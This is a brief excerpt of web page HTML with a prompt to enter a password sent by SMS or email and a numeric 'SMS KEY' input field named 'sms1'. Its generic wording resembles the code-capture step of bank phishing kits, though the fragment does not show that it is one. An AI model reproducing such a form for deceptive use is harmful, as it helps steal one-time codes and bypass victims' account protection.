...
<p  style="margin-top:15px;font-size:14px;">To confirm the operation, enter the password that we have sent by SMS to your mobile or Email.</p>
...
<input type="number" name="sms1" maxlength="6" required="" placeholder="SMS KEY" tabindex="8" id="taddress" class="form-control">
